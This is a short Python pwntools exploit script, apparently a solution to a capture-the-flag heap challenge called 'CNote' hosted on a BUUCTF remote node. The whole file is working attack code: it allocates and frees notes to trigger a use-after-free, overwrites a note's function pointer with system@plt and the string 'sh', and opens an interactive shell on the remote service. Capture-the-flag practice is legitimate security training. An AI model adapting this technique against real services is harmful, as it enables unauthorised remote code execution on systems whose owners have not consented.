from pwn import *
context.log_level='debug'
# io = process('./pwn')
io = remote('node4.buuoj.cn', 25182)
elf = ELF("./pwn")
def add(index, type, content, length=0):
    io.sendlineafter(b'CNote > ', b'1')
    io.sendlineafter(b'Index > ', str(index).encode())
    io.sendlineafter(b'Type > ', str(type).encode())
    if type == 2:
        io.sendlineafter(b'Length > ', str(length).encode())
    io.sendlineafter(b'Value > ', content)

def delete(index):
    io.sendlineafter(b'CNote > ', b'2')
    io.sendlineafter(b'Index > ', str(index).encode())

def dump(index):
    io.sendlineafter(b'CNote > ', b'3')
    io.sendlineafter(b'Index > ', str(index).encode())

add(0, 2, b'/bin/sh', 0x10)
add(1, 1, b'123456')
delete(0)
delete(1)
add(2, 2, b'sh\x00\x00' + p32(elf.plt['system']), 0xc)
delete(0)
io.interactive()